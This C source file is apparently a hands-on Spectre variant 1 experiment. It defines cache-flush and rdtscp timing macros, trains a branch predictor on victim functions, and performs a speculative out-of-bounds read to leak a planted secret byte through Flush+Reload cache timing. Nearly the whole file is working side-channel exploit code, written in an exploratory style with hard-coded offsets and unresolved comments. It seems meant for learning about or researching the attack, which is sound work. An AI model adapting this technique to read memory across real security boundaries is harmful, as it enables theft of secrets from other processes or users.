#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>


#define clflush(_addr) asm volatile("clflush (%0)" : : "r" (_addr));
#define measure_time(_time, _addr) asm volatile(\
	"mfence\n"\
	"rdtscp\n"\
	"mov %%rax, %%r10\n"\
	"mov (%1), %%rcx\n"\
	"rdtscp;\n"\
	"sub %%r10, %%rax\n"\
	: "=a"(_time)\
	: "b"(_addr));

#define clflush_array(_array)\
	for (int i = 0; i < 256; i++)\
	{\
		clflush(&_array[i * 4096 + DELTA]);\
	};\
	asm volatile("mfence");

// To avoid fetching previous line
#define DELTA 1024
#define CACHE_HIT_THRESHOLD 120
#define ITERATION 100



int global_Array_Size = 30;
int bufferSize = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
// unreachable but known address
char secret[] = "It's the secret";


int findHighestHit(int* measurements){
	// find highest
	int highestIndex = 0;
	for (int i = 0; i < 256; i++)
	{
		if(measurements[i] > measurements[highestIndex]){
			highestIndex = i;
		}
	}
	return highestIndex;
}

/**
 * Access to the secret element multiple times 
 * 
*/ 
void find_cache_hit_predefined_secret(uint8_t* array, int secret){

	int measurements[256];
	for (int i = 0; i < 256; i++)
	{
		measurements[i] = 0;
	}
	
	// do multiple measurements
	for (int it = 0; it < ITERATION; it++)
	{
		// access
		array[secret * 4096 + DELTA] = 12;

		for (int i = 0; i < 256; i++)
		{
			uint64_t time_dif = 0;
			measure_time(time_dif, &array[i * 4096 + DELTA]);

			if(time_dif < CACHE_HIT_THRESHOLD){
				measurements[i]++;
				break;
			}
		}
		clflush_array(array);
	}

	
	printf("Highest index:%d\n",findHighestHit(measurements));
}

void victim1(size_t x, uint8_t* array){
	if(x < global_Array_Size){
		// in bounds
		int temp = array[x * 4096 + DELTA];
	}
}

/**
 * Train victim. Then access to out of bounds
 * Cache that value
 * 
*/ 
void find_cache_hit_spectre1(uint8_t* array){
	
	int upperlimit = 1000;
	while(upperlimit)
	{
		int measurements[256];
		for (int i = 0; i < 256; i++)
		{
			measurements[i] = 0;
		}

		// do multiple measurements
		for (int it = 0; it < ITERATION; it++)
		{
			// train victim
			for (int i = 0; i < 20; i++)
			{
				clflush(&global_Array_Size);
				victim1(i, array);
			}

			clflush(&global_Array_Size);
			clflush_array(array);

			victim1(133, array);
	
			for (int i = 0; i < 256; i++)
			{
				uint64_t time_dif = 0;
				measure_time(time_dif, &array[i * 4096 + DELTA]);

				if(time_dif < CACHE_HIT_THRESHOLD){
					measurements[i]++;
					break;
				}
			}
			clflush_array(array);
		}
		if(findHighestHit(measurements) != 0){
			printf("Highest index:%d\n",findHighestHit(measurements));		
			break;
		}
		// repeat
		upperlimit--;
	}
}

void victim_to_buffer(size_t x, uint8_t* array){
	if(x < bufferSize){
		int temp = array[x * 4096 + DELTA];
	}
}

/**
 * Finds accessed element in speculative execution 
*/ 
void find_accessed_element(uint8_t* array){

	int measurements[256];
	for (int i = 0; i < 256; i++)
	{
		measurements[i] = 0;
	}
	
	for (int i = 0; i < 256; i++)
	{
		uint64_t time_dif = 0;
		measure_time(time_dif, &array[i * 4096 + DELTA]);
		
		if(time_dif < CACHE_HIT_THRESHOLD){
			measurements[i]++;
			break;
		}
	}
	int minIndex = 0;
	int minValue = 300;
	// find highest
	for (int i = 0; i < 256; i++)
	{
		if(measurements[i] < minValue){
			minValue = measurements[i];
			minIndex = i;
		}
	}
	printf("minIndex:%d\n", minIndex);
	asm volatile("mfence");
}

void steal_1byte_secret(uint8_t* array){

	int measurements[256];
	for (int i = 0; i < 256; i++)
	{
		measurements[i] = 0;
	}

	int upperlimit = 1;
	// do multiple measurements
	while(upperlimit)
	{
		clflush_array(array);
		// train victim
		for (int i = 0; i < 20; i++)
		{
			clflush(&bufferSize);
			victim_to_buffer(i%9, array);
			find_accessed_element(array);
			clflush_array(array);
		}
		clflush(&bufferSize);
		clflush_array(array);

		// for out of bounds access
		//size_t larger_x = (size_t)(secret - (char*)buffer);  
		size_t larger_x = 18;
		// access to the array
		victim_to_buffer(larger_x, array);
		

		for (int i = 1; i < 256; i++)
		{
			uint64_t time_dif = 0;
			measure_time(time_dif, &array[i * 4096 + DELTA]);
			
			if(time_dif < CACHE_HIT_THRESHOLD){
				measurements[i]++;
				break;
			}
		}
		// repeat
		upperlimit--;
	}
	/*
	for (int i = 0; i < 256; i++)
	{
		printf("measurements[%d]:%d\n", i , measurements[i]);
	}
	*/
	printf("Highest index:%d\n",findHighestHit(measurements));
}

int main(){

	printf("Spectre is started\n");

	uint8_t * array = (uint8_t *) malloc(4096 * 256 * sizeof(uint8_t));

	for (int i = 0; i < 256 * 4096; i++)
	{
		array[i] = i % 256;
	}

	clflush_array(array);
	// TODO, DONT DELETE IT

	/*
	uint64_t time_dif1 = 0;
	uint64_t time_dif2 = 0;
	uint64_t time_dif3 = 0;
	
	// 0 and 40 are the same. 41 is different. WHY?
	measure_time(time_dif1, &array[0]);
	measure_time(time_dif2, &array[40]);
	measure_time(time_dif3, &array[41]);
	*/

	
	//find_cache_hit_predefined_secret(array, 93);
	
	//find_cache_hit_spectre1(array);

	steal_1byte_secret(array);
	return 0;
}